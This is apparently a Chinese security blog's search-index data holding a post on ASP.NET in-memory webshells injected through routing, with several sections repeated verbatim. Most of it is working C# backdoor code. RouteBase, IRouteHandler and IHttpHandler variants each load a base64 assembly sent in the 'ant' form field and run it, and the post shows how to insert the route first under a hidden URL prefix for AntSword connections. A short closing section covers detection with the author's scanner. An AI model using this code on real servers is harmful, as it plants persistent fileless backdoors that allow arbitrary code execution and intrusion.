包含正则表达式或对象的值的对象 IRouteConstraint 。 这些值用于确定参数值是否有效。 如果我们能够动态打进去一个路由，然后映射到我们自定义的类，即可实现内存马的效果。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:2:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#systemwebrouting"},{"categories":["技术文章"],"content":"\r3 Route内存马那么如何添加呢？我们上一篇文章看到了在mvc中是存在一个GlobalFilters.Filters来存放filter，第二个RouteTable.Routes便是存放全局route的collection。 public class MvcApplication : System.Web.HttpApplication { protected void Application_Start() { AreaRegistration.RegisterAllAreas(); FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters); RouteConfig.RegisterRoutes(RouteTable.Routes); BundleConfig.RegisterBundles(BundleTable.Bundles); } } 这里提一嘴为啥不能直接用mvc下面的RouteConfig.RegisterRoutes来注册route 点进函数可以看到调用了System.Web.Mvc.RouteCollectionExtensions.MapRoute方法，而这个方法也是要依赖System.Web.Mvc.dll的。所以不能直接拿来用。 public class RouteConfig { public static void RegisterRoutes(RouteCollection routes) { routes.IgnoreRoute(\"{resource}.axd/{*pathInfo}\"); routes.MapRoute( name: \"Default\", url: \"{controller}/{action}/{id}\", defaults: new { controller = \"Home\", action = \"Index\", id = UrlParameter.Optional } ); } } 一路寻找重载，发现实际上就是给RouteTable.Routes里面增加了一个元素，我们直接调用route.Add即可。 System.Web.Routing.RouteCollection.Add第一个参数是名字，不过没有太大用处，只是为了判断map里面有没有重复的。第二个参数是重点，要打进去一个RouteBase类型的item。RouteBase是个抽象类，默认的实现为System.Web.Routing.Route。 这里就有不同的操作方式了，第一种是自己实现一个RouteBase，第二种是new一个System.Web.Routing.Route对象。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#route内存马"},{"categories":["技术文章"],"content":"\r3.1 自己实现RouteBase继承RouteBase需要实现两个方法： GetRouteData(HttpContextBase) 在派生类中重写时，返回关于请求的路由信息。 GetVirtualPath(RequestContext, RouteValueDictionary) 在派生类中重写时，检查路由是否与指定的值匹配，如果匹配，则生成 URL，并检索有关该路由的信息。 3.1.1 GetRouteData这个点是目前来看最佳的注入点，beichen师傅在kcon的演讲中也是用的这个函数。改写GetRouteData方法，里面加入我们的shell逻辑即可。这里HttpContextBase是个抽象类，具体的实现是HttpContextWrapper，需要用到反射来获取我们需要的request跟response。 这里注意一定要加HttpResponse.End()，具体原因大家可以思考一下。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { FieldInfo requestField = typeof(HttpRequestWrapper).GetField(\"_httpRequest\", BindingFlags.Instance | BindingFlags.NonPublic); HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request); FieldInfo responseField = typeof(HttpResponseWrapper).GetField(\"_httpResponse\", BindingFlags.Instance | BindingFlags.NonPublic); HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response); System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(new object[] { httpRequest, httpResponse }); httpResponse.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 更简单的一种做法是直接用HttpContext.Current就获取当前的Context对象，传入Equals里即可。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { HttpContext context = HttpContext.Current; String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 将我们的逻辑注入到GetRouteData函数中，这是第一种写法。 3.1.2 GetVirtualPath其实用GetVirtualPath也是可以注入我们的逻辑的，这是第二种写法。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 3.1.3 优先级那么到底哪个函数会更先被调用呢？我在两个函数，以及Controller里分别加了一条打印的语句。 发现顺序是 GetRouteData\u003eController\u003eGetVirtualPath，所以还是GetRouteData比较好用。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:1","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#自己实现routebase"},{"categories":["技术文章"],"content":"\r3.1 自己实现RouteBase继承RouteBase需要实现两个方法： GetRouteData(HttpContextBase) 在派生类中重写时，返回关于请求的路由信息。 GetVirtualPath(RequestContext, RouteValueDictionary) 在派生类中重写时，检查路由是否与指定的值匹配，如果匹配，则生成 URL，并检索有关该路由的信息。 3.1.1 GetRouteData这个点是目前来看最佳的注入点，beichen师傅在kcon的演讲中也是用的这个函数。改写GetRouteData方法，里面加入我们的shell逻辑即可。这里HttpContextBase是个抽象类，具体的实现是HttpContextWrapper，需要用到反射来获取我们需要的request跟response。 这里注意一定要加HttpResponse.End()，具体原因大家可以思考一下。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { FieldInfo requestField = typeof(HttpRequestWrapper).GetField(\"_httpRequest\", BindingFlags.Instance | BindingFlags.NonPublic); HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request); FieldInfo responseField = typeof(HttpResponseWrapper).GetField(\"_httpResponse\", BindingFlags.Instance | BindingFlags.NonPublic); HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response); System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(new object[] { httpRequest, httpResponse }); httpResponse.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 更简单的一种做法是直接用HttpContext.Current就获取当前的Context对象，传入Equals里即可。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { HttpContext context = HttpContext.Current; String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 将我们的逻辑注入到GetRouteData函数中，这是第一种写法。 3.1.2 GetVirtualPath其实用GetVirtualPath也是可以注入我们的逻辑的，这是第二种写法。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 3.1.3 优先级那么到底哪个函数会更先被调用呢？我在两个函数，以及Controller里分别加了一条打印的语句。 发现顺序是 GetRouteData\u003eController\u003eGetVirtualPath，所以还是GetRouteData比较好用。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:1","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#getroutedata"},{"categories":["技术文章"],"content":"\r3.1 自己实现RouteBase继承RouteBase需要实现两个方法： GetRouteData(HttpContextBase) 在派生类中重写时，返回关于请求的路由信息。 GetVirtualPath(RequestContext, RouteValueDictionary) 在派生类中重写时，检查路由是否与指定的值匹配，如果匹配，则生成 URL，并检索有关该路由的信息。 3.1.1 GetRouteData这个点是目前来看最佳的注入点，beichen师傅在kcon的演讲中也是用的这个函数。改写GetRouteData方法，里面加入我们的shell逻辑即可。这里HttpContextBase是个抽象类，具体的实现是HttpContextWrapper，需要用到反射来获取我们需要的request跟response。 这里注意一定要加HttpResponse.End()，具体原因大家可以思考一下。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { FieldInfo requestField = typeof(HttpRequestWrapper).GetField(\"_httpRequest\", BindingFlags.Instance | BindingFlags.NonPublic); HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request); FieldInfo responseField = typeof(HttpResponseWrapper).GetField(\"_httpResponse\", BindingFlags.Instance | BindingFlags.NonPublic); HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response); System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(new object[] { httpRequest, httpResponse }); httpResponse.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 更简单的一种做法是直接用HttpContext.Current就获取当前的Context对象，传入Equals里即可。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { HttpContext context = HttpContext.Current; String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 将我们的逻辑注入到GetRouteData函数中，这是第一种写法。 3.1.2 GetVirtualPath其实用GetVirtualPath也是可以注入我们的逻辑的，这是第二种写法。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 3.1.3 优先级那么到底哪个函数会更先被调用呢？我在两个函数，以及Controller里分别加了一条打印的语句。 发现顺序是 GetRouteData\u003eController\u003eGetVirtualPath，所以还是GetRouteData比较好用。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:1","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#getvirtualpath"},{"categories":["技术文章"],"content":"\r3.1 自己实现RouteBase继承RouteBase需要实现两个方法： GetRouteData(HttpContextBase) 在派生类中重写时，返回关于请求的路由信息。 GetVirtualPath(RequestContext, RouteValueDictionary) 在派生类中重写时，检查路由是否与指定的值匹配，如果匹配，则生成 URL，并检索有关该路由的信息。 3.1.1 GetRouteData这个点是目前来看最佳的注入点，beichen师傅在kcon的演讲中也是用的这个函数。改写GetRouteData方法，里面加入我们的shell逻辑即可。这里HttpContextBase是个抽象类，具体的实现是HttpContextWrapper，需要用到反射来获取我们需要的request跟response。 这里注意一定要加HttpResponse.End()，具体原因大家可以思考一下。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { FieldInfo requestField = typeof(HttpRequestWrapper).GetField(\"_httpRequest\", BindingFlags.Instance | BindingFlags.NonPublic); HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request); FieldInfo responseField = typeof(HttpResponseWrapper).GetField(\"_httpResponse\", BindingFlags.Instance | BindingFlags.NonPublic); HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response); System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(new object[] { httpRequest, httpResponse }); httpResponse.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 更简单的一种做法是直接用HttpContext.Current就获取当前的Context对象，传入Equals里即可。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { HttpContext context = HttpContext.Current; String Payload = httpContext.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { return null; } } 将我们的逻辑注入到GetRouteData函数中，这是第一种写法。 3.1.2 GetVirtualPath其实用GetVirtualPath也是可以注入我们的逻辑的，这是第二种写法。 public class MyRoute : RouteBase { public override RouteData GetRouteData(HttpContextBase httpContext) { return null; } public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 3.1.3 优先级那么到底哪个函数会更先被调用呢？我在两个函数，以及Controller里分别加了一条打印的语句。 发现顺序是 GetRouteData\u003eController\u003eGetVirtualPath，所以还是GetRouteData比较好用。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:1","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#优先级"},{"categories":["技术文章"],"content":"\r3.2 利用System.Web.Routing.Route另一种做法就是沿着现有实现类Route的逻辑来走。 他的构造类需要两个参数，第一个是url pattern，第二个是对应的处理handler。 实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler 这里其实又有不同的操作了，内存马的本质是我们把恶意的代码注入到了一个每次Web请求都会触发的地方。 所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler里加恶意逻辑。 3.2.1 注入RouteHandler public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 报错不影响连接，如果有强迫症可以实现一个空的IHttpHandler。 3.2.2 注入HttpHandler主要逻辑在ProcessRequest里，这是第四种写法 public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { return new Myhandler(requestContext); } } public class Myhandler : IHttpHandler { public RequestContext RequestContext { get; private set; } public Myhandler(RequestContext context) { this.RequestContext = context; } public void ProcessRequest(HttpContext context) { String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } context.Response.End(); } public bool IsReusable { get { return false; } } } 3.2.3 路由问题文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?view=netframework-3.5#System_Web_Routing_Route_Url 将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使用大括号 ({}) 来定义称为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在大括号中的属性中的任何值都将被视为文本常量。 ?不允许在属性中使用该字符 Url 。 必须通过分隔符或文本常量分隔每个 URL 段。 可以将 {{ 或 }} 用作大括号字符的转义符。 用这种方式有一个问题，Route的URL默认没有正则，不能像java一样直接指定/*，但是可以用{xxx}来表示任意变量 在此为了不影响业务，我们选择一个只有自己知道的开头的字符串 new Route(\"mr6{page}\", new MyRoute()) 这样任意/mr6xxxxx 都可以连接。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:2","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#利用systemwebroutingroute"},{"categories":["技术文章"],"content":"\r3.2 利用System.Web.Routing.Route另一种做法就是沿着现有实现类Route的逻辑来走。 他的构造类需要两个参数，第一个是url pattern，第二个是对应的处理handler。 实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler 这里其实又有不同的操作了，内存马的本质是我们把恶意的代码注入到了一个每次Web请求都会触发的地方。 所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler里加恶意逻辑。 3.2.1 注入RouteHandler public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 报错不影响连接，如果有强迫症可以实现一个空的IHttpHandler。 3.2.2 注入HttpHandler主要逻辑在ProcessRequest里，这是第四种写法 public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { return new Myhandler(requestContext); } } public class Myhandler : IHttpHandler { public RequestContext RequestContext { get; private set; } public Myhandler(RequestContext context) { this.RequestContext = context; } public void ProcessRequest(HttpContext context) { String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } context.Response.End(); } public bool IsReusable { get { return false; } } } 3.2.3 路由问题文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?view=netframework-3.5#System_Web_Routing_Route_Url 将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使用大括号 ({}) 来定义称为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在大括号中的属性中的任何值都将被视为文本常量。 ?不允许在属性中使用该字符 Url 。 必须通过分隔符或文本常量分隔每个 URL 段。 可以将 {{ 或 }} 用作大括号字符的转义符。 用这种方式有一个问题，Route的URL默认没有正则，不能像java一样直接指定/*，但是可以用{xxx}来表示任意变量 在此为了不影响业务，我们选择一个只有自己知道的开头的字符串 new Route(\"mr6{page}\", new MyRoute()) 这样任意/mr6xxxxx 都可以连接。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:2","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#注入routehandler"},{"categories":["技术文章"],"content":"\r3.2 利用System.Web.Routing.Route另一种做法就是沿着现有实现类Route的逻辑来走。 他的构造类需要两个参数，第一个是url pattern，第二个是对应的处理handler。 实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler 这里其实又有不同的操作了，内存马的本质是我们把恶意的代码注入到了一个每次Web请求都会触发的地方。 所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler里加恶意逻辑。 3.2.1 注入RouteHandler public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 报错不影响连接，如果有强迫症可以实现一个空的IHttpHandler。 3.2.2 注入HttpHandler主要逻辑在ProcessRequest里，这是第四种写法 public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { return new Myhandler(requestContext); } } public class Myhandler : IHttpHandler { public RequestContext RequestContext { get; private set; } public Myhandler(RequestContext context) { this.RequestContext = context; } public void ProcessRequest(HttpContext context) { String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } context.Response.End(); } public bool IsReusable { get { return false; } } } 3.2.3 路由问题文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?view=netframework-3.5#System_Web_Routing_Route_Url 将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使用大括号 ({}) 来定义称为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在大括号中的属性中的任何值都将被视为文本常量。 ?不允许在属性中使用该字符 Url 。 必须通过分隔符或文本常量分隔每个 URL 段。 可以将 {{ 或 }} 用作大括号字符的转义符。 用这种方式有一个问题，Route的URL默认没有正则，不能像java一样直接指定/*，但是可以用{xxx}来表示任意变量 在此为了不影响业务，我们选择一个只有自己知道的开头的字符串 new Route(\"mr6{page}\", new MyRoute()) 这样任意/mr6xxxxx 都可以连接。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:2","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#注入httphandler"},{"categories":["技术文章"],"content":"\r3.2 利用System.Web.Routing.Route另一种做法就是沿着现有实现类Route的逻辑来走。 他的构造类需要两个参数，第一个是url pattern，第二个是对应的处理handler。 实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler 这里其实又有不同的操作了，内存马的本质是我们把恶意的代码注入到了一个每次Web请求都会触发的地方。 所以我们既可以在RouteHandler中添加恶意逻辑，也可以在实现的HttpHandler里加恶意逻辑。 3.2.1 注入RouteHandler public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { HttpContext context = HttpContext.Current; String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } return null; } } 报错不影响连接，如果有强迫症可以实现一个空的IHttpHandler。 3.2.2 注入HttpHandler主要逻辑在ProcessRequest里，这是第四种写法 public class MyRoute : IRouteHandler { public IHttpHandler GetHttpHandler(RequestContext requestContext) { return new Myhandler(requestContext); } } public class Myhandler : IHttpHandler { public RequestContext RequestContext { get; private set; } public Myhandler(RequestContext context) { this.RequestContext = context; } public void ProcessRequest(HttpContext context) { String Payload = context.Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(context); context.Response.End(); } context.Response.End(); } public bool IsReusable { get { return false; } } } 3.2.3 路由问题文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route.url?view=netframework-3.5#System_Web_Routing_Route_Url 将值分配给 Url 属性时，在 / 分析 URL 时，字符被解释为分隔符。 使用大括号 ({}) 来定义称为 URL 参数的变量。 将 URL 中的匹配段的值分配给 URL 参数。 Url未括在大括号中的属性中的任何值都将被视为文本常量。 ?不允许在属性中使用该字符 Url 。 必须通过分隔符或文本常量分隔每个 URL 段。 可以将 {{ 或 }} 用作大括号字符的转义符。 用这种方式有一个问题，Route的URL默认没有正则，不能像java一样直接指定/*，但是可以用{xxx}来表示任意变量 在此为了不影响业务，我们选择一个只有自己知道的开头的字符串 new Route(\"mr6{page}\", new MyRoute()) 这样任意/mr6xxxxx 都可以连接。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:2","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#路由问题"},{"categories":["技术文章"],"content":"\r3.3 添加到第一位跟mvc的filter不同的是，Route的add方法没有order参数的选项，所以依然要考虑如何把我们的shell添加到第一位的问题。 RouteCollection本质是个Collection，所以只需要调用Insert方法，并且指定位置为0即可把我们的shell添加到第一位。 RouteCollection routes = RouteTable.Routes; routes.Insert(0, (RouteBase)new MyRoute()); 至此我们的内存马大业就算完成了。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:3:3","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#添加到第一位"},{"categories":["技术文章"],"content":"\r4 测试访问注入内存马的aspx，一片空白说明注入成功 蚁剑中输入任意url，连接成功。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:4:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#测试"},{"categories":["技术文章"],"content":"\r5 检测内存马本人写了个小脚本 ASP.NET-Memshell-Scanner，可用于各类内存马的检测。 下载项目中的检测脚本 https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx，放到网站目录下，浏览器访问。 其中id为1的是使用本文中实现RouteBase的方式注入的内存马，这种情况下Router Type为攻击者自己设置的类名，并且没有RouteHandler。 id为2的是使用本文中利用System.Web.Routing.Route注入的内存马，这种情况下Router Type为System.Web.Routing.Route，RouteHandler Type为攻击者自己设置的类名，并且存在URL路径。 实锤方法同上文，找到可疑Router的CodeBase文件，使用dnspy等反编译工具打开。 找到类名对应的文件，发现恶意代码，即可确认被注入了内存马。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:5:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#检测内存马"},{"categories":["技术文章"],"content":"\r6 参考https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-3.5 https://www.cnblogs.com/liangxiaofeng/p/5619866.html https://www.programminghunter.com/article/8505151604/ https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf https://mp.weixin.qq.com/s/cm8pPAw7dZ-iMb4LvVXAlQ ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:6:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#参考"},{"categories":["技术文章"],"content":"\r6.1 添加到第一位跟mvc的filter不同的是，Route的add方法没有order参数的选项，所以依然要考虑如何把我们的shell添加到第一位的问题。 RouteCollection本质是个Collection，所以只需要调用Insert方法，并且指定位置为0即可把我们的shell添加到第一位。 RouteCollection routes = RouteTable.Routes; routes.Insert(0, (RouteBase)new MyRoute()); 至此我们的内存马大业就算完成了。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:6:1","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#添加到第一位-1"},{"categories":["技术文章"],"content":"\r7 测试访问注入内存马的aspx，一片空白说明注入成功 蚁剑中输入任意url，连接成功。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:7:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#测试-1"},{"categories":["技术文章"],"content":"\r8 参考https://docs.microsoft.com/zh-cn/dotnet/api/system.web.routing.route?view=netframework-3.5 https://www.cnblogs.com/liangxiaofeng/p/5619866.html https://www.programminghunter.com/article/8505151604/ https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf https://docs.microsoft.com/zh-cn/aspnet/mvc/overview/older-versions-1/controllers-and-routing/asp-net-mvc-routing-overview-vb ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:8:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#参考-1"},{"categories":["技术文章"],"content":" 本文首发于ASP.NET下的内存马(1) filter内存马 - 跳跳糖 (tttang.com) ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:0:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#"},{"categories":["技术文章"],"content":"\r1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。 文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。 ","date":"2021-12-18","objectID":"/posts/asp-net-memory-filter/:1:0","series":null,"tags":[],"title":"ASP.NET下的内存马(一)：filter内存马","uri":"/posts/asp-net-memory-filter/#前言"},{"categories":["技术文章"],"content":"\r2 ASP.NET MVC结构java下有filter，servlet等拦截器，asp.net mvc也有同样类似的机制。 在rider中新建一个asp.net web项目，默认就会起一个asp.net mvc的项目。 根目录下有个 